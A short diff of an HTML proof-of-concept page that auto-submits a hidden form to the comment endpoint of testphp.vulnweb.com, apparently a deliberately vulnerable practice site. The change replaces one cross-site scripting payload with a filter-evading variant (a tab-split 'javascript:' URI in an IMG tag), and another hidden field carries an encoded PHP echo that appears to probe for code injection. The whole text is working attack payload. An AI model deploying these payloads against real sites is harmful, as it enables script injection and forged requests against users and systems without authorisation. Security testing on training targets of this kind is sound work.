@@ -3,7 +3,7 @@
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://testphp.vulnweb.com/comment.php" method="POST">
-      <input type="hidden" name="name" value="&#x3c;&#x49;&#x4d;&#x47;&#x20;&#x53;&#x52;&#x43;&#x3d;&#x23;&#x20;&#x6f;&#x6e;&#x6d;&#x6f;&#x75;&#x73;&#x65;&#x6f;&#x76;&#x65;&#x72;&#x3d;&#x22;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x78;&#x73;&#x27;&#x29;&#x22;&#x3e;" />
+      <input type="hidden" name="name" value="<IMG SRC="jav&#x09;ascript:alert('XSS');">" />
       <input type="hidden" name="comment" value="abc" />
       <input type="hidden" name="Submit" value="Submit" />
       <input type="hidden" name="phpaction" value="echo&#32;&#36;&#95;POST&#91;comment&#93;&#59;" />
